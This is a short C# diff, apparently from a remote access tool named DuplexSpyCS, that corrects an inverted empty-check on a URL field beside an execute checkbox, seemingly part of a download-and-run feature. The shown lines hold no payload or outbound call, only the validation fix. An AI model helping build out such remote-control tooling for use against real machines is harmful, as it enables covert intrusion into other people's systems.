@@ -102,7 +102,7 @@ namespace DuplexSpyCS
             string szURL = textBox1.Text;
             bool bExec = checkBox1.Checked;
 
-            if (!string.IsNullOrEmpty(szURL))
+            if (string.IsNullOrEmpty(szURL))
             {
                 MessageBox.Show("URL is null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
